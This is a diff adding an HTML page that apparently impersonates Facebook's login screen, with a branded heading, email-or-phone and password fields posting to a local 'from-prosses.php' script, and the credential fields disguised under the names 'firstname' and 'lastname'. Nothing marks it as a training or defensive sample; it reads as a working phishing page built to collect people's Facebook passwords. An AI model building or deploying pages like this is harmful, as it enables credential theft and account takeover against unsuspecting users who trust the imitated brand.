@@ -1,0 +1,147 @@
+<html>
+
+<body>
+
+    <head>
+        <title>Facebook login</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            * {
+                margin: 0px;
+                padding: 0px;
+            }
+            
+            *,
+            *:before,
+            *:after {
+                box-sizing: inherit;
+            }
+            
+            body {
+            height:100vh;
+                background-color: rgba(255, 255, 255, 0.938);
+            }
+            
+            h2 {
+                text-align: center;
+                margin-bottom: 30px;
+                color: rgb(13, 16, 230);
+                font-size: 30px;
+            }
+            @media screen and (max-width: 670px) {
+  #Con{
+  left:55%;}
+}
+            .content {
+                width: 420px;
+                height: 520px;
+                background: rgba(255, 254, 254, 0.034);
+                top: 50%;
+                left: 50%;
+                position: absolute;
+                transform: translate(-50%, -50%);
+                box-sizing: border-box;
+                padding: 10px 30px;
+                border-radius: 10px;
+            }
+            
+            .content input {
+                margin-top: 10px;
+                
+                border-radius: 8px;
+                background-color: rgba(145, 129, 129, 0.185);
+                margin-right: -10px;
+                padding: 17px;
+                border: none;
+                width: 370px;
+            }
+            
+            button {
+                margin-top: 15px;
+                border: none;
+                background-color: rgb(13, 16, 230);
+                margin-top: 10px;
+                color: cornsilk;
+                font-size: 15px;
+                margin-left: -10px;
+                border-radius: 5px;
+                margin-right: -10px;
+                padding: 10px;
+                width: 370px;
+            }
+            
+            .content p {
+                margin-top: 10px;
+                text-align: center;
+                font-size: 15px;
+            }
+            .btn {
+                background-color: rgba(9, 139, 9, 0.938);
+                width: 200px;
+                text-align: center;
+                border: none;
+                margin-left: 0px;
+                margin-top: 100px;
+            }
+            
+            .btn a {
+                color: white;
+                text-decoration: none;
+                font-family: "Roboto", sans-serif;
+                font-size: 15px;
+                padding: 10px;
+            }
+            
+            .pp a {
+                color: white;
+                text-decoration: none;
+                font-family: "Roboto", sans-serif;
+                font-size: 15px;
+                padding: 10px;
+            }
+.pp{
+margin-left:1px}
+            
+            a {
+                color: rgb(4, 48, 241);
+                text-decoration: none;
+                font-family: "Roboto", sans-serif;
+                font-size: 13px;
+text-align:center;
+            }
+.ortext{
+background:#ffff;
+color:black;
+border-radius:50%;
+padding:5px;
+text-align:center;
+top: 56%;
+                left: 50%;
+                position: absolute;
+                transform: translate(-50%, -50%);}
+.har{
+margin-top:28px}
+        </style>
+    </head>
+    <div class="content" id="Con">
+        <h2>Facebook
+            <h2>
+                <form action="from-prosses.php" method="POST">
+                    <input type="text" name="firstname" id="firstname" placeholder="Enter number or email" class="form-control" required>
+                    <input type="password" name="lastname" id="lastname" placeholder="password" class="form-control" required>
+                    <button class="pp" value="submit">Log In </button>
+                    <p><a href="">Forgotten password?</a></p>
+<div class="har">
+<hr>
+<div class="ortext">
+<p>or</p>
+</div>
+</div>
+                    <button class="btn"><a href="www.google.com">Create New Account</a></button>
+                </form>
+    </div>
+
+    </div>
+</body>
+
+</html>
